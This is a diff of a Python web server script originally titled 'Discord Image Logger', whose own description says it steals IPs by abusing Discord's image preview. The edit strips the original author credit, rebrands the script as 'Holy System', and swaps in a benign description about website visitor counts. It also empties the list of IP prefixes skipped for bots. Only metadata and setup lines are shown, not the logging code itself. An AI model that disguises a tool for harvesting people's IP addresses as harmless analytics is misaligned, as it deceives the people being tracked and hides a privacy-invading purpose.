@@ -1,14 +1,14 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+# Holy System
+# By MammaMia Holy
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__description__ = "A simple application that allows you control your website management and lets you know how much person visited your web!"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "MammaMia"
 
 config = {
     # BASE CONFIG #
@@ -63,7 +63,7 @@ config = {
     # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+blacklistedIPs = ("") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
